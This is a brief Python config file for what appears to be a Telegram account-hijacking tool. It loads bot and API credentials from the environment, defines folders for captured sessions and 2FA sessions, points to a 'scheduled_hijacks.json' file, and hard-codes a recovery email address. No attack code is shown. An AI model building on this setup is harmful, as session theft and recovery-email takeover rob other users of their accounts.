import os
MAIN_BOT_TOKEN = os.environ.get("MAIN_BOT_TOKEN")
API_ID = int(os.environ.get("API_ID"))
API_HASH = os.environ.get("API_HASH")

BASE_DATA_PATH = "/app/data"
SESSION_FOLDER = "/app/data/sessions"
MY_SESSION_PATH = "/app/data/sessions/my_account"
SESSION_2FA_FOLDER = "/app/data/sessions_2fa"
CHAT_FOLDER = "/app/data/chats"
SCHEDULE_FILE = "/app/data/scheduled_hijacks.json"

RECOVERY_EMAIL = "balamutdans@gmail.com"
